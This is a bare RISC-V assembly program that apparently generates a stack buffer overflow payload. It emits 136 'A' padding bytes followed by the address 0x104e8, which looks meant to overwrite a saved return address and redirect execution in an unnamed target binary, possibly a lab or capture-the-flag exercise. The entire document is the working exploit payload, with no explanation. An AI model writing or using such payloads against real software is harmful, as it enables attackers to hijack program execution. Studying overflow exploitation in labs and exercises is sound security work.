
.section .data
payload:
    .fill 136, 1, 0x41
    .quad 0x00000000000104e8
.section .text
.global _start
_start:
    li a7, 64
    li a0, 1
    la a1, payload
    li a2, 144
    ecall
    li a7, 93
    li a0, 0
    ecall


